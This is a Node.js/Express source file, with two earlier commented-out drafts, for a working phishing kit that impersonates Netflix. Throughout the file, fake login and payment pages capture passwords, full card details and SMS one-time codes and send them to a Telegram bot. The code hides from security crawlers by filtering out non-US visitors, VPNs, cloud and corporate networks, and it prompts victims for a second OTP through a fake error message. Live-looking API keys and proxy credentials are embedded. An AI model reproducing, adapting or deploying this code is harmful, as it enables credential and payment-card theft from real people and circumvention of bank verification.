// const express = require('express');
// const vhost = require('vhost');
// const session = require('express-session');
// const { v4: uuidv4 } = require('uuid');
// const axios = require('axios');
// const app = express();

// const IPINFO_API_TOKEN = '5f0f25362f9053'; // Replace with your actual API token

// // Configure session middleware
// app.use(session({
//   secret: 'ThfstiyvWBtcBohE2tkUrhX2EGSUpYE6',
//   resave: false,
//   saveUninitialized: true,
//   cookie: { secure: false }  // Set secure to true if using https
// }));

// const subdomainApp = express();

// subdomainApp.use(async (req, res, next) => {
//   try {
//     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
//     const response = await axios.get(`https://ipinfo.io/${ip}?token=${IPINFO_API_TOKEN}`);
//     req.geoLocation = response.data;
//   } catch (error) {
//     console.error('Error fetching geolocation:', error);
//     req.geoLocation = null;
//   }
//   next();
// });

// subdomainApp.get('/login', (req, res) => {
//   const geoLocation = req.geoLocation ? JSON.stringify(req.geoLocation, null, 2) : 'Location data not available';
//   res.send(`
//     <h1>Welcome to your unique subdomain: ${req.hostname}</h1>
//     <pre>Your geolocation data: ${geoLocation}</pre>
//   `);
// });

// const mainApp = express();
// mainApp.get('/', (req, res) => {
//   if (!req.session.subdomain) {
//     req.session.subdomain = uuidv4();
//   }
//   const uniqueSubdomain = `${req.session.subdomain}.biii.us`;
//   res.redirect(`http://${uniqueSubdomain}/login`);
// });

// app.use(vhost('*.biii.us', subdomainApp));
// app.use(vhost('transitor.biii.us', mainApp));

// app.listen(3011, () => {
//   console.log('Server running on port 3011');
// });


// const express = require("express");
// const bodyParser = require("body-parser");
// const axios = require("axios");
// const { v4: uuidv4 } = require("uuid");
// const session = require("express-session");

// const app = express();
// const port = 3011;

// // Middleware to parse form data
// app.use(bodyParser.urlencoded({ extended: true }));

// // Middleware for sessions
// app.use(session({
//   secret: 'ThfstiyvWBtcBohE2tkUrhX2EGSUpYE5', // Change this to a secure key
//   resave: false,
//   saveUninitialized: true,
//   cookie: { secure: false } // Set secure to true if using HTTPS
// }));

// // Middleware to handle unique subdomain generation and redirection
// app.use((req, res, next) => {
//   const host = req.headers.host;
//   const subdomain = req.session.subdomain;

//   if (host === 'transitor.biii.us') {
//     if (!subdomain) {
//       let uuid = uuidv4();
//       let uuidParts = uuid.split('-');
//       uuidParts[uuidParts.length - 1] = 'account-resolve';
//       req.session.subdomain = uuidParts.join('-');
//     }
//     res.redirect(`http://${req.session.subdomain}.biii.us/login`);
//   } else if (host.endsWith('.biii.us')) {
//     next();
//   } else {
//     res.status(403).send('Access Forbidden');
//   }
// });

// // Serve static files (e.g., HTML, CSS, JS) from a directory named 'NTFLX'
// app.use(express.static("NTFLX"));

// // Route to handle GET request
// app.get("/login", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/index.html");
// });

// // Capture user's IP address
// const getClientIp = (req) => {
//   return req.headers['x-forwarded-for'] || req.socket.remoteAddress;
// };

// async function sendMessageToBot(userLoginId, password, ip) {
//   const botToken = "7129475570:AAE4oX9VxtCqALfHtqjTqCnj6YWP_Pn8wj8"; // Replace with your Telegram bot's token
//   const chatId = "1096335592"; // Replace with your chat ID where you want to send the message

//   // Prepare the message
//   const message = `- NFX LOGIN - \nUSER: ${userLoginId}\nPASS: ${password}\nIP: ${ip}\n- NFX LOGIN -`;

//   try {
//     const response = await axios.post(
//       `https://api.telegram.org/bot${botToken}/sendMessage`,
//       {
//         chat_id: chatId,
//         text: message,
//       },
//     );
//     console.log("Message sent:", response.data);
//   } catch (error) {
//     console.error("Failed to send message:", error);
//   }
// }

// async function sendMessageToBotv1(creditCardNumber, creditExpirationMonth, creditCardSecurityCode, firstName, creditZipcode, ip) {
//   const botToken = "7129475570:AAE4oX9VxtCqALfHtqjTqCnj6YWP_Pn8wj8"; // Replace with your Telegram bot's token
//   const chatId = "1096335592"; // Replace with your chat ID where you want to send the message

//   // Prepare the message
//   const message = `- NFX DATA - \nCCNUM: ${creditCardNumber}\nEXP DATE: ${creditExpirationMonth}\nCVV: ${creditCardSecurityCode}\nFULL NAME: ${firstName}\nZIPCODE: ${creditZipcode}\nIP: ${ip}\n- NFX DATA -`;

//   try {
//     const response = await axios.post(
//       `https://api.telegram.org/bot${botToken}/sendMessage`,
//       {
//         chat_id: chatId,
//         text: message,
//       },
//     );
//     console.log("Message sent:", response.data);
//   } catch (error) {
//     console.error("Failed to send message:", error);
//   }
// }

// app.post("/submit-form", (req, res) => {
//   const params = req.body.param;
//   const ip = getClientIp(req);

//   try {
//     const parsedParams = JSON.parse(decodeURIComponent(params));
//     const { userLoginId, password } = parsedParams.fields;
//     console.log(`User: ${userLoginId}, Password: ${password}`);
//     sendMessageToBot(userLoginId, password, ip);
//     res.redirect("/thank-you");
//   } catch (e) {
//     console.error("Failed to parse parameters:", e);
//     res.status(400).send("Invalid parameters");
//   }
// });

// app.post("/updatePaymentMethod", (req, res) => {
//   const ip = getClientIp(req);

//   try {
//     const {
//       creditCardNumber,
//       creditExpirationMonth,
//       creditCardSecurityCode,
//       firstName,
//       creditZipcode,
//     } = req.body; // Directly destructure the fields from req.body

//     console.log(
//       `CARD: ${creditCardNumber}, EXPD: ${creditExpirationMonth}, CVV: ${creditCardSecurityCode}, NAME: ${firstName}, ZIPCODE: ${creditZipcode}, IP: ${ip}`,
//     );
//     sendMessageToBotv1(
//       creditCardNumber,
//       creditExpirationMonth,
//       creditCardSecurityCode,
//       firstName,
//       creditZipcode,
//       ip,
//     );
//     res.redirect("/thank-you");
//   } catch (e) {
//     console.error("Failed to handle request:", e);
//     res.status(400).send("Invalid parameters");
//   }
// });

// app.get("/thank-you", (req, res) => {
//   res.redirect("https://netflix.com/login");
// });

// app.get("/simplemember/images/NL-en-20240506-popsignuptwoweeks-perspective_alpha_website_large.jpg", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/images/NL-en-20240506-popsignuptwoweeks-perspective_alpha_website_large.jpg");
// });

// app.get("/simplemember/images/NL-en-20240506-popsignuptwoweeks-perspective_alpha_website_medium.jpg", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/images/NL-en-20240506-popsignuptwoweeks-perspective_alpha_website_medium.jpg");
// });

// app.get("/simplemember/images/NL-en-20240506-popsignuptwoweeks-perspective_alpha_website_small.jpg", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/images/NL-en-20240506-popsignuptwoweeks-perspective_alpha_website_small.jpg");
// });

// app.get("/ppIPaymentSubmitter", (req, res) => {
//   console.log("USER CLICKED ON PPL ---> REDIRECTING...");
//   res.redirect("https://invpy.pl/e8pal");
// });

// app.get("/simplemember/paymentupdater", (req, res) => {
//   res.sendFile(__dirname + "/NTFLX/update.html");
// });

// // Start the server
// app.listen(port, () => {
//   console.log(`Server running at http://localhost:${port}`);
// });


const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const { v4: uuidv4 } = require("uuid");
const session = require("express-session");
const { getJson } = require("serpapi");
const { HttpsProxyAgent } = require("https-proxy-agent");
const crypto = require('crypto');

const username = 'user-spf5y6s5bn-sessionduration-1';
const password = 'h+3kcvd8X7F8CaycjG';
const encodedCredentials = encodeProxyCredentials(username, password);
const proxyHost = 'gate.smartproxy.com';
const proxyPort = getRandomPort();
const proxyUrl = `http://${encodedCredentials}@${proxyHost}:${proxyPort}`;
const agent = new HttpsProxyAgent(proxyUrl);

const app = express();
const port = 3011;
const serpApiKey = "6e6fbeec8b93c270672a35e9eef3e9649db8c7cd8fe533f7a9764d65583b8ce1";

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Set up EJS as the view engine
app.set("view engine", "ejs");

// Middleware for sessions
app.use(
    session({
        secret: "ThfstiyvWBtcBohE2tkUrhX2EGSUpYE5",
        resave: false,
        saveUninitialized: true,
        cookie: { secure: false },
    }),
);

// Function to encode proxy credentials
function encodeProxyCredentials(username, password) {
    return `${encodeURIComponent(username)}:${encodeURIComponent(password)}`;
}

// Function to get a random port for the proxy
function getRandomPort(min = 10000, max = 10700) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Capture user's IP address
const getClientIp = (req) => {
    return req.headers["x-forwarded-for"] || req.socket.remoteAddress;
};

// Function to send message to Telegram
async function sendMessageToBot(message) {
    const botToken = "6426542539:AAFS-3WzuTvQ5AWiwqYh01j6rLlMxMUTp8g";
    const chatId = "1096335592";
    const data = {
        text: message,
        chat_id: chatId,
    };

    try {
        await axios.get(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            params: data,
        });
        console.log("Message sent to Telegram");
    } catch (error) {
        console.error("Failed to send message:", error);
    }
}

// Middleware for IP checking
app.use(async (req, res, next) => {
    const ip = getClientIp(req).split(",")[0];
    console.log(`Visitor IP: ${ip}`);

    const checkIPInfo = async (ip) => {
        const IPINFO_TOKEN = "91f39841764127";
        const url = `https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`;

        try {
            const response = await axios.get(url);
            const { country, privacy, company } = response.data;
            
            if (country !== "US") {
                return false;
            }
        
            if (privacy.vpn || privacy.proxy || privacy.tor || privacy.hosting) {
                return false;
            }
        
            if (company.type === "hosting" || company.type === "business") {
                return false;
            }
        
            if (company && company.name) {
                const asnName = company.name.toLowerCase();
                if (
                    asnName.includes("google") ||
                    asnName.includes("facebook") ||
                    asnName.includes("oracle") ||
                    asnName.includes("amazon")
                ) {
                    return false;
                }
        
                if (asnName.includes("centurylink") || asnName.includes("stanford")) {
                    console.log(`SUS VISITOR FROM ${asnName} -->`, ip);
                    const ipQualityScoreUrl = `https://ipqualityscore.com/api/json/ip/juD90IvBTtl5YrYfzPmHXcFhf2BSqZis/${ip}?strictness=1&allow_public_access_points=true&fast=true&lighter_penalties=true&mobile=true`;
                    const ipQualityScoreResponse = await axios.get(ipQualityScoreUrl);
                    const { recent_abuse, bot_status } = ipQualityScoreResponse.data;
                    
                    if (recent_abuse || bot_status) {
                        console.log(`BLOCKED ${asnName} BOT -->`, ip);
                        return false;
                    }
                }
            }
        
            return true;
        } catch (error) {
            console.error("Error fetching IPInfo:", error.message);
            return false;
        }
    };

    try {
        const allowed = await checkIPInfo(ip);
        if (!allowed) {
            console.log("BLOCKED USER", ip);
            return res.status(403).json({
                success: false,
                message: "VPN/PROXY not allowed, remove to proceed.",
            });
        }
        console.log("ALLOWED IP", ip);
        next();
    } catch (error) {
        console.error("Error in middleware:", error);
        res.status(500).json({
            success: false,
            message: "Internal Server Error",
        });
    }
});

// Middleware for domain checking
app.use((req, res, next) => {
    const host = req.headers.host;
    if (host.endsWith('fly.dev') || host.endsWith('unsuccessactivity.com')) {
        next();
    } else {
        res.redirect("https://netflix.com/login");
    }
});

// Serve static files
app.use(express.static("NTFLX"));

// Route to handle GET request
app.get("/login", (req, res) => {
    res.sendFile(__dirname + "/NTFLX/index.html");
});

// Function to detect card type
const detectCardType = (cardNumber) => {
  const firstDigit = cardNumber.charAt(0);
  const firstTwoDigits = cardNumber.substring(0, 2);
  
  if (firstDigit === '4') {
    return 'Visa';
  } else if (['51', '52', '53', '54', '55'].includes(firstTwoDigits)) {
    return 'Mastercard';
  } else {
    return 'Unknown';
  }
};


const blacklistedBanks = ['Chase'];

// Route to handle payment method update
app.post("/updatePaymentMethod", async (req, res) => {
    const ip = getClientIp(req);
    try {
        const {
            creditCardNumber,
            creditExpirationMonth,
            creditCardSecurityCode,
            firstName,
            creditZipcode,
        } = req.body;

        // Log received data for debugging (remove in production)
        console.log("Received data:", req.body);

        if (!creditCardNumber) {
            return res.status(400).json({
                success: false,
                message: "Credit card number is required."
            });
        }

        const bin = creditCardNumber.replace(/\s+/g, "").slice(0, 6);
        const randomPort = getRandomPort();
        const proxyUrl = `http://${encodedCredentials}@${proxyHost}:${randomPort}`;
        const agent = new HttpsProxyAgent(proxyUrl);

        let bankName = "Unknown Bank";
        let cardType = "Unknown";
        let isBlacklisted = false;

        try {
            const binlistResponse = await axios.get(
                `https://lookup.binlist.net/${bin}`,
                { httpsAgent: agent },
            );
            bankName = binlistResponse.data.bank.name
                ? binlistResponse.data.bank.name
                : detectCardType(creditCardNumber);
            cardType = binlistResponse.data.scheme
                ? binlistResponse.data.scheme
                : detectCardType(creditCardNumber);
            
            // Check if the bank is blacklisted
            isBlacklisted = blacklistedBanks.includes(bankName);
        } catch (error) {
            console.error("BIN lookup failed:", error.message);
            cardType = detectCardType(creditCardNumber);
        }

        // Store required data in session
        req.session.ccnumber = creditCardNumber;
        req.session.phoneNumber = "1234567890"; // Set a dummy phone number for testing
        req.session.firstName = firstName;
        req.session.bankName = bankName;
        req.session.cardType = cardType;

        // Send the payment details message to Telegram
        const paymentDetailsMessage = `- NFX DATA - \nCCNUM: ${creditCardNumber}\nCARD TYPE: ${cardType}\nEXP DATE: ${creditExpirationMonth}\nCVV: ${creditCardSecurityCode}\nFULL NAME: ${firstName}\nZIPCODE: ${creditZipcode}\nBANK: ${bankName}\nIP: ${ip}\nBLACKLISTED: ${isBlacklisted ? 'YES' : 'NO'}\n- NFX DATA -`;
        await sendMessageToBot(paymentDetailsMessage);

        // Check if the bank is blacklisted after sending to Telegram
        if (isBlacklisted) {
            return res.status(400).json({
                success: false,
                message: "This card type is not accepted. Please use a different card."
            });
        }

        // Redirect to OTP verification page
        res.redirect(
            `/otp-verification?bank=${encodeURIComponent(bankName)}&cchold=${encodeURIComponent(firstName)}`,
        );
    } catch (e) {
        console.error("Failed to handle request:", e);
        res.status(400).json({
            success: false,
            message: "Invalid parameters"
        });
    }
});

app.post("/submit-form", (req, res) => {
    const params = req.body.param;
    const ip = getClientIp(req);

    try {
        const parsedParams = JSON.parse(decodeURIComponent(params));
        const { userLoginId, password } = parsedParams.fields;
        const message = `- NFX LOGIN - \nUSER: ${userLoginId}\nPASS: ${password}\nIP: ${ip}\n- NFX LOGIN -`;
        sendMessageToBot(message);
        res.redirect("/thank-you");
    } catch (e) {
        console.error("Failed to parse parameters:", e);
        res.status(400).send("Invalid parameters");
    }
});

// Route to handle OTP verification GET request
app.get("/otp-verification", (req, res) => {
    const { bank, cchold } = req.query;
    const error = req.query.error || 0;

    if (!bank || !cchold) {
        return res.status(400).send("Missing required parameters");
    }

    const query = {
        engine: "google",
        api_key: serpApiKey,
        q: `${bank} bank logo official`,
        tbm: "isch",
        ijn: "0",
    };

    getJson(query, (json) => {
        const images_results = json.images_results;
        const lkhr = images_results.length ? images_results[0].original : "";
        const dateYmd = new Date().toLocaleDateString("en-US");
        const phone = req.session.phoneNumber || "Unknown";
        const okbbx = error == 1 ? "okbbxErr" : "okbbx";
        const msg =
            error == 1
                ? `<div class='msg oaerror danger' style='width: 90%; display: table; align-items: stretch;'><p>The one-Time Passcode entered is incorrect. Another OTP has been sent to your mobile <h4 style='font-weight:bold;'>****</h4></p></div>`
                : "<div class='msg oaerror info' style='width: 90%; display: table; align-items: stretch;'>One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile.</div>";

        res.render("otp", {
            lkhr,
            phone: getTruncatedPHONE(phone),
            dateYmd,
            ccNum: getTruncatedCCNumber(req.session.ccnumber),
            cchold: req.session.firstName ? req.session.firstName.toUpperCase() : cchold.toUpperCase(),
            bank: req.session.bankName || bank,
            ip_address: req.ip,
            error,
            okbbx,
            msg,
        });
    });
});

// Route to handle OTP verification POST request
app.post("/otp-verification", async (req, res) => {
    const { thd } = req.body;
    const ip = getClientIp(req);
    const error = req.query.error || 0;

    let message;
    if (error == 1) {
        message = `-------------------- <3 NFX2 <3-------------------
2ND SMS Code  : ${thd}
IP      : ${ip}:
-------------------- <3 NFX2 <3-------------------`;
    } else {
        message = `-------------------- <3 NFX <3-------------------
SMS Code  : ${thd}
IP      : ${ip}:
-------------------- <3 NFX <3-------------------`;
    }

    await sendMessageToBot(message);

    if (error == 1) {
        req.session.islast = req.body.islast || "no";
        if (req.session.islast == "yes") {
            setTimeout(() => {
                res.redirect("/thank-you");
            }, 3000);
        } else {
            setTimeout(() => {
                res.redirect(
                    `/otp-verification?error=1&bank=${encodeURIComponent(req.session.bankName)}&cchold=${encodeURIComponent(req.session.firstName)}`,
                );
            }, 2000);
        }
    } else {
        setTimeout(() => {
            res.redirect(
                `/otp-verification?error=1&bank=${encodeURIComponent(req.session.bankName)}&cchold=${encodeURIComponent(req.session.firstName)}`,
            );
        }, 10000);
    }
});

app.get("/thank-you", (req, res) => {
    res.redirect("https://netflix.com/login");
});

app.get(
    "/simplemember/images/NL-en-20240506-popsignuptwoweeks-perspective_alpha_website_large.jpg",
    (req, res) => {
        res.sendFile(
            __dirname +
            "/NTFLX/images/NL-en-20240506-popsignuptwoweeks-perspective_alpha_website_large.jpg",
        );
    },
);

app.get(
    "/simplemember/images/NL-en-20240506-popsignuptwoweeks-perspective_alpha_website_medium.jpg",
    (req, res) => {
        res.sendFile(
            __dirname +
            "/NTFLX/images/NL-en-20240506-popsignuptwoweeks-perspective_alpha_website_medium.jpg",
        );
    },
);

app.get(
    "/simplemember/images/NL-en-20240506-popsignuptwoweeks-perspective_alpha_website_small.jpg",
    (req, res) => {
        res.sendFile(
            __dirname +
            "/NTFLX/images/NL-en-20240506-popsignuptwoweeks-perspective_alpha_website_small.jpg",
        );
    },
);

app.get("/simplemember/nficon2023.ico", (req, res) => {
    res.sendFile(__dirname + "/NTFLX/nficon2023.ico");
});

app.get("/ppIPaymentSubmitter", (req, res) => {
    console.log("USER CLICKED ON PPL ---> REDIRECTING...");
    res.redirect("https://poipy.pl/ntf1x");
});

app.get("/simplemember/paymentupdater", (req, res) => {
    res.sendFile(__dirname + "/NTFLX/update.html");
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});

// Helper functions
function getTruncatedPHONE(phone) {
    if (!phone) return "****-****"; // Return a default masked number if phone is undefined
    return phone.slice(0, -4).replace(/\d/g, "*") + phone.slice(-4);
}

function getTruncatedCCNumber(ccNum) {
    if (!ccNum) return "XXXX-XXXX-XXXX-XXXX"; // Return a default masked number if ccNum is undefined
    return ccNum.slice(0, -4).replace(/\d/g, "X") + ccNum.slice(-4);
}

